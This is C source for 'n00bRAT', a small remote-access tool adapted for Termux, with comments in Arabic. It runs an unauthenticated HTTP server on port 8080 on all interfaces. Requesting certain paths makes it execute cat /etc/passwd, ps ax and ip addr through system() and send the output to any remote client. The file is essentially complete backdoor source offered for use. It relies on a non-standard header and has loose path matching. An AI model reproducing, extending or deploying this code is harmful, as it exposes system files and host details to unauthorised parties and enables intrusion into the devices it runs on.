#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <h00c2.h>
// تعاريف افتراضية إذا لم تكن موجودة في ملف الترويسة الخاص بك
#define MAXSTRSIZE 8192
#define PORT 8080
#define BACKLOG 10

// متغيرات عالمية
char httpResponse[MAXSTRSIZE]="\0";
char *httpResponse200 = "HTTP/1.1 200 OK\nServer: n00b\nContent-Type: text/html\n\n"
                        "<html><head><title>n00bRAT - Termux</title></head>"
                        "<body><center><h1>-=n00bRAT=-</h1>"
                        "<h3>TuX Remote Admin v0.7 (Termux Optimized)</h3></center>"
                        "<div id='actions'>"
                        "<a href='/1'>/etc/passwd</a><br/>"
                        "<a href='/4'>Process List (ps)</a><br/>"
                        "<a href='/6'>Network Info (ip a)</a><br/>"
                        "</div><br/></body></html>";

char *httpResponse400 = "HTTP/1.1 400 Bad Request\nServer: n00b\nContent-Type: text/html\n\n"
                        "<html><body><h1>400 Bad Request</h1></body></html>";

char Request[MAXSTRSIZE]="\0";
int pfds[2];
int fd, fd2;
int axnCode;

// النماذج الأولية مع إضافة الوسائط الناقصة
void dupStreamz();
void tellClient();
int getAXN();
int getAXNCode(char* axnTok);

int main() {
    int numbytes;
    struct sockaddr_in server, client;
    socklen_t sin_size; // تغيير النوع ليتوافق مع المعايير الحديثة

    dupStreamz();

    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("socket error");
        exit(-1);
    }

    // السماح بإعادة استخدام المنفذ فوراً (مهم لـ GCC 15/Termux)
    int opt = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;

    int noobPort = PORT;
    server.sin_port = htons(noobPort);
    memset(&(server.sin_zero), 0, 8);

    if (bind(fd, (struct sockaddr *)&server, sizeof(struct sockaddr)) == -1) {
        perror("bind error");
        exit(-1);
    }

    printf("Listening on port: %d\n", noobPort);
    if (listen(fd, BACKLOG) == -1) {
        perror("listen error");
        exit(-1);
    }

    while(1) {
        sin_size = sizeof(struct sockaddr_in);
        if ((fd2 = accept(fd, (struct sockaddr *)&client, &sin_size)) == -1) {
            continue; 
        }

        if ((numbytes = recv(fd2, Request, MAXSTRSIZE - 1, 0)) > 0) {
            Request[numbytes] = '\0';
            axnCode = getAXN();
            tellClient();
        }
        close(fd2);
    }
    return 0;
}

void dupStreamz() {
    if (pipe(pfds) == -1) {
        perror("pipe error");
        exit(1);
    }
    dup2(pfds[1], STDOUT_FILENO); // استخدام dup2 بدلاً من close/dup لضمان الأمان
    return;
}

void tellClient() {
    char buf[MAXSTRSIZE];
    char tmpBuf[MAXSTRSIZE * 2];
    memset(buf, 0, sizeof(buf));
    memset(tmpBuf, 0, sizeof(tmpBuf));

    // تعيين الاستجابة الأساسية
    strcpy(httpResponse, (axnCode >= -1) ? httpResponse200 : httpResponse400);

    // تنفيذ الأوامر (تعديل الأوامر لتناسب صلاحيات Termux)
    switch(axnCode) {
        case 1: system("cat /etc/passwd 2>&1"); break;
        case 4: system("ps ax 2>&1"); break;
        case 6: system("ip addr 2>&1"); break;
        default: printf("Waiting for command...\n"); break;
    }

    // قراءة مخرجات الأوامر من الأنبوب (Pipe)
    // ملاحظة: في بيئة الإنتاج يفضل استخدام fcntl لجعل القراءة non-blocking
    read(pfds[0], buf, MAXSTRSIZE - 1);
    
    snprintf(tmpBuf, sizeof(tmpBuf), "%s\n<pre>%s</pre>", httpResponse, buf);
    send(fd2, tmpBuf, strlen(tmpBuf), 0);
}

int getAXN() {
    char reqCopy[MAXSTRSIZE];
    strncpy(reqCopy, Request, MAXSTRSIZE);
    char *axnTok = strtok(reqCopy, " ");
    if (axnTok != NULL) {
        axnTok = strtok(NULL, " ");
        if (axnTok != NULL) return getAXNCode(axnTok);
    }
    return -10;
}

int getAXNCode(char* axnTok) {
    if (strcmp("/", axnTok) == 0 || strcmp("/n00b", axnTok) == 0) return -1;
    if (strstr(axnTok, "/1")) return 1;
    if (strstr(axnTok, "/4")) return 4;
    if (strstr(axnTok, "/6")) return 6;
    return -10;
}
